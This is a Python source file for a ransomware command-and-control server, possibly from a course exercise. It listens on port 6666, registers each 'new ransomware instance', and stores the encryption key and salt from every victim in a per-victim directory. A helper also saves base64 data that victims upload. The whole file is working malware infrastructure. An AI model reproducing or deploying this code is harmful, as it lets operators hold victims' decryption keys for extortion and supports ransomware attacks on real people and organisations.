import base64
from hashlib import sha256
from http.server import HTTPServer
import os
import hashlib


from cncbase import CNCBase

class CNC(CNCBase):
    ROOT_PATH = "/root/CNC"

    def save_b64(self, token:str, data:str, filename:str):
        # helper
        # token and data are base64 field

        bin_data = base64.b64decode(data)
        path = os.path.join(CNC.ROOT_PATH, token, filename)
        with open(path, "wb") as f:
            f.write(bin_data)

    def post_new(self, path:str, params:dict, body:dict)->dict:
        # used to register new ransomware instance
        token = body["token"] 
        self._log.info(f"TOKEN: {token}")
        salt = body["salt"] 
        key = body["key"] 
        token_dec = hashlib.sha256(base64.b64decode(token)).hexdigest() 
        victim_dir = os.path.join(CNC.ROOT_PATH, token_dec)
        os.makedirs(victim_dir, exist_ok=True)

        #Saving the sel and in the folder of the person
        with open(os.path.join(victim_dir, "salt"), "w") as salt_f:
            #salt_f.write(base64.b64decode(salt)) 
            salt_f.write(salt)
        with open(os.path.join(victim_dir, "key"), "w") as key_f:
            #key_f.write(base64.b64decode(key)) 
            key_f.write(key)

        #Return a reponse dictionary 
        if os.path.isdir(victim_dir):
            return {" status " : " Success "}
        else:
            return {" status " : " Error "}

     
httpd = HTTPServer(('0.0.0.0', 6666), CNC)
httpd.serve_forever()